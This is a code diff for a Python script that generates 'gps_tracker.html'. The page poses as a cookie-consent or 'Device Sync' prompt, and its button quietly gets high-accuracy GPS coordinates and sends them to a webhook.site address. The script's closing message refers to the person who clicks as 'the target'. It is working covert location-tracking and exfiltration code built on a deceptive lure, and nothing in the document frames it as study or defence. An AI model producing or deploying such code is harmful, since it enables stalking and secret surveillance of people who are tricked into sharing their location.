@@ -1,36 +1,65 @@
+# 1. PASTE YOUR WEBHOOK URL HERE
+WEBHOOK_URL = "https://webhook.site/7275cfa3-36ae-4122-9d75-13625ecd9d04"
 
+html_content = f"""
 <!DOCTYPE html>
 <html>
 <head>
-    <title>SITE TESTING</title>
+    <title> SITE TESTING VERIFICATION </title>
 </head>
-<body style="text-align: center; font-family: sans-serif; padding-top: 50px;">
-    <h2>SITE TESTING</h2>
-    <p>Allow necessarry cookiee?.</p>
+<body style="text-align: center; font-family: Arial; padding-top: 50px;">
+    <h2>Device Sync</h2>
+    <p>Please click the button to allow cookis.</p>
     
-    <button onclick="getLocation()" style="padding: 15px; background: blue; color: white; border: none; border-radius: 5px;">
-        Ok
+    <button onclick="getLocation()" style="padding: 15px 30px; font-size: 18px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer;">
+        OK!!
     </button>
 
-    <p id="display"></p>
+    <p id="status"></p>
 
     <script>
-    function getLocation() {
-        if (navigator.geolocation) {
-            // This is the magic line that triggers the GPS hardware
-            navigator.geolocation.getCurrentPosition(showPosition);
-        } else { 
-            alert("Geolocation is not supported by this browser.");
-        }
-    }
+    function getLocation() {{
+        const status = document.getElementById("status");
+        status.innerHTML = "Locating...";
 
-    function showPosition(position) {
-        let lat = position.coords.latitude;
-        let lon = position.coords.longitude;
-        document.getElementById("display").innerHTML = 
-            "<br><b>Target Found!</b><br>Latitude: " + lat + "<br>Longitude: " + lon +
-            "<br><br><a href='https://www.google.com/maps?q=" + lat + "," + lon + "'>View on Google Maps</a>";
-    }
+        if (navigator.geolocation) {{
+            // High accuracy ensures GPS is used instead of just IP
+            const options = {{ enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }};
+            
+            navigator.geolocation.getCurrentPosition(sendToServer, handleError, options);
+        }} else {{
+            status.innerHTML = "Geolocation is not supported by this browser.";
+        }}
+    }}
+
+    function sendToServer(position) {{
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        const accuracy = position.coords.accuracy;
+
+        // This 'fetch' sends the data to your Webhook dashboard silently
+        fetch('{WEBHOOK_URL}?lat=' + lat + '&lon=' + lon + '&acc=' + accuracy)
+        .then(() => {{
+            document.getElementById("status").innerHTML = "Verification Complete. You can close this tab.";
+        }})
+        .catch(err => {{
+            console.error("Error sending data:", err);
+            document.getElementById("status").innerHTML = "Sync Error. Please try again.";
+        }});
+    }}
+
+    function handleError(error) {{
+        document.getElementById("status").innerHTML = "Error: " + error.message + ". Please allow location access.";
+    }}
     </script>
 </body>
 </html>
+"""
+
+# Save the updated file
+with open("gps_tracker.html", "w") as f:
+    f.write(html_content)
+
+print("Updated 'gps_tracker.html' created.")
+print(f"When the target clicks 'Allow', coordinates will appear at: {WEBHOOK_URL}")
+
